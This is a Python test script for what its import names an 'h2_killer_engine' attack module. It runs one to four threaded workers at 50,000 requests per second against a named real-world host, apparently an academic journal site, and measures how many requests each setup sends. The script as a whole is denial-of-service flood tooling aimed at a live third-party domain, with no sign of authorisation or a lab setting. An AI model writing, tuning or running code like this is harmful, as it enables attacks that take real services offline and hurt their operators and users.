"""Test multiple killer workers."""
import sys, time, threading, queue
sys.path.insert(0, '.')
from core.attack.engines.h2_killer_engine import run_killer_worker

host = 'ojs.phb.ac.id'

for workers in [1, 2, 3, 4]:
    stop = threading.Event()
    q = queue.Queue()
    results = []
    threads = []
    for wi in range(workers):
        r = {}
        results.append(r)
        t = threading.Thread(
            target=run_killer_worker,
            kwargs=dict(
                target_url='https://%s/' % host,
                rps=50000, duration=5, worker_id=wi,
                stats_queue=q, stop_event=stop,
                host_header=host, connections=4,
                result_dict=r,
            ),
            daemon=True,
        )
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=10)
    stop.set()
    for t in threads:
        t.join(timeout=2)
    total = sum(r.get('sent', 0) for r in results)
    pending = sum(r.get('pending', 0) for r in results)
    failed = sum(r.get('failed', 0) for r in results)
    rps = total / 5
    print(f'{workers} workers (4conn each): sent={total}, pending={pending}, failed={failed}, RPS={rps:.0f}')
